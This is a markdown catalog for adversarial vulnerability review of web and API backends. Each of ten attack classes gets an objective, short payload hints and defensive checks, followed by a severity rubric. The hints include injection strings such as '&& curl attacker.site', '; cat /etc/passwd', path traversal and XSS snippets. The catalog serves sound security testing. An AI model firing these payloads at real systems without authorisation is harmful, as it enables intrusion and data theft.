# Common Software Attack Catalog

Use this catalog to run adversarial vulnerability discovery against typical software systems (especially web/API backends).

## Quick Triage

1. Map public entry points (HTTP routes, GraphQL resolvers, RPC handlers, upload endpoints, auth flows).
2. Mark where untrusted input touches query builders, shell/process execution, templates, file I/O, and permission checks.
3. Select attack scenarios from this catalog and execute deterministic reproductions.
4. Keep only findings that are reproducible with concrete request/response evidence and code location (`path:line`).

## 1) SQL Injection / NoSQL Injection

### Objective
Execute unauthorized read/write operations by breaking query intent.

### Payload hints
- `' OR 1=1 --`
- `admin' UNION SELECT ...`
- NoSQL operator smuggling (`{"$ne": null}`, `{"$gt": ""}`)

### Verify
- Queries are parameterized (no string concatenation with user input).
- ORM/raw query helpers reject operator/predicate injection.
- Error messages do not leak query fragments or schema details.

## 2) Command Injection

### Objective
Execute arbitrary system commands through user-controlled command arguments.

### Payload hints
- `; cat /etc/passwd`
- `&& curl attacker.site`
- Backticks/`$()` command substitution

### Verify
- No direct shell interpolation with untrusted input.
- Safe process APIs with strict argument allowlists are used.
- Dangerous metacharacters are rejected before process invocation.

## 3) Cross-Site Scripting (XSS)

### Objective
Run attacker JavaScript in victim browser context.

### Payload hints
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- SVG/Markdown rendering payloads

### Verify
- Output encoding is context-aware (HTML/attribute/JS/URL).
- Rich text rendering uses sanitization with strict allowlist.
- CSP and other browser protections are present and not trivially bypassed.

## 4) Cross-Site Request Forgery (CSRF)

### Objective
Force authenticated user actions without intent.

### Payload hints
- Auto-submitting hidden form to state-changing endpoint
- Cross-origin fetch/image requests to unsafe GET endpoints

### Verify
- State-changing requests require CSRF token or equivalent anti-forgery control.
- Session cookies use `SameSite` and secure attributes.
- Unsafe mutations are not exposed via GET.

## 5) Server-Side Request Forgery (SSRF)

### Objective
Abuse server-side fetch capabilities to reach internal or privileged networks.

### Payload hints
- `http://127.0.0.1:...`
- Cloud metadata endpoints
- DNS rebinding or alternate IP formats

### Verify
- Outbound request targets are validated against allowlist.
- Private address ranges and local protocols are blocked.
- Redirect chains and DNS resolution are re-validated.

## 6) Path Traversal and Unsafe File Access

### Objective
Read or overwrite unintended files via crafted paths.

### Payload hints
- `../../../../etc/passwd`
- Encoded traversal (`..%2f..%2f`)

### Verify
- File paths are canonicalized before access.
- Access is restricted to expected base directories.
- User-controlled filenames are normalized and validated.

## 7) Broken Access Control (IDOR/BOLA/Privilege Escalation)

### Objective
Access objects or actions beyond current identity permissions.

### Payload hints
- Swap resource IDs across users/tenants
- Role flag tampering in request body/query
- Hidden admin endpoint probing

### Verify
- Server-side authorization runs for every protected action.
- Ownership/tenant checks are explicit at object access points.
- Client-supplied role/permission fields are ignored.

## 8) Session and Token Weakness (JWT/API Key)

### Objective
Hijack or forge authentication sessions/tokens.

### Payload hints
- Expired/replayed token reuse
- Algorithm confusion attempts
- Weak key/secret brute force assumptions

### Verify
- Token signature, issuer, audience, expiry, and nonce/jti are validated.
- Revocation/logout semantics prevent replay where required.
- Session fixation and insecure cookie settings are blocked.

## 9) Unsafe File Upload

### Objective
Upload executable or malicious content to achieve code execution or data compromise.

### Payload hints
- Polyglot files (valid image + script payload)
- Double extensions (`file.jpg.php`)
- MIME/content-type mismatch tricks

### Verify
- File type validation uses trusted server-side checks.
- Uploaded files are stored outside executable paths.
- Scan/quarantine and size/type limits are enforced.

## 10) Security Misconfiguration and Data Exposure

### Objective
Exploit weak defaults or leaked secrets.

### Payload hints
- Debug/admin routes exposed in production
- Overly permissive CORS (`*` with credentials)
- Secrets in logs, errors, client bundles, or public endpoints

### Verify
- Production-safe config defaults and environment separation.
- Sensitive headers and caching rules are correct.
- Errors/logs redact secrets and internal details.

## Severity Rubric

Use `severity = impact x exploitability x reach`.

- Impact (1-5): confidentiality/integrity/availability/business damage
- Exploitability (1-5): prerequisites, skill required, automation ease
- Reach (1-5): single user, tenant, cross-tenant, whole system

Prioritize highest composite score findings first.
